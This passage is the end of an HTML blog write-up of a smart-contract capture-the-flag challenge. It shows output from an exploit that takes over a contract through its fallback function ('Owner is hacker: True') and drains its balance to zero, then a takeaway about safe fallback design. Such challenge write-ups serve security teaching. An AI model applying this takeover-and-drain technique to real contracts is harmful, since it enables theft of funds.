+</span></span><span style="display:flex;"><span>  Transaction confirmed   Block: <span style="color:#ae81ff">10681696</span>   Gas used: <span style="color:#ae81ff">28912</span> <span style="color:#f92672">(</span>90.91%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Transaction sent: 0xfd5dc46feac1abca358d3625029461a1231732bf30c2461033435dd3a4084b84
+</span></span><span style="display:flex;"><span>  Gas price: 2.530514464 gwei   Gas limit: <span style="color:#ae81ff">30522</span>   Nonce: <span style="color:#ae81ff">17</span>
+</span></span><span style="display:flex;"><span>  Transaction confirmed   Block: <span style="color:#ae81ff">10681697</span>   Gas used: <span style="color:#ae81ff">25549</span> <span style="color:#f92672">(</span>83.71%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Owner is hacker: True
+</span></span><span style="display:flex;"><span>Transaction sent: 0x3457feb604162a2dfb0f020302aac25f3b1b691dd87ddb2bf4122faedb6ada94
+</span></span><span style="display:flex;"><span>  Gas price: 2.479560643 gwei   Gas limit: <span style="color:#ae81ff">35918</span>   Nonce: <span style="color:#ae81ff">18</span>
+</span></span><span style="display:flex;"><span>  Waiting <span style="color:#66d9ef">for</span> confirmation... <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  Transaction confirmed   Block: <span style="color:#ae81ff">10681747</span>   Gas used: <span style="color:#ae81ff">30398</span> <span style="color:#f92672">(</span>84.63%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Final contract balance: <span style="color:#ae81ff">0</span>
+</span></span></code></pre></div><h2 id="takeaways">Takeaways</h2>
+<p>As you may have noticed, this challenge is about understanding the concept behind a <code>fallback</code> function and how to keep it simple, avoiding dangerous implementations used to change a contract ownership.</p>
+
+    </article>
+  </div>
+
+</div>
+
+
+  </div>
+<script type="text/javascript" src="/main.js" defer></script>
+
+
+</body>
+
+</html>
